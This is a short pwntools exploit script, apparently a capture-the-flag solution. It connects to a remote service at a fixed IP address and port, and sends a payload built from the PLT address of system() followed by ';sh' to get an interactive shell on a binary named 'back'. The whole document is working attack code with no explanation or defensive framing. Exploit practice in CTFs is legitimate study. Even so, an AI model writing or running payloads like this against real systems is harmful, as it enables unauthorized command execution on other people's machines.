from pwn import*
from time import*
#p=process('./back')
#sleep(5)
p=remote('101.42.48.14',8093)
elf=ELF('./back')
system_plt=elf.plt['system']
payload=p32(system_plt)+b';sh\x00'
p.recvuntil('door\n')
p.sendline(payload)
p.interactive()
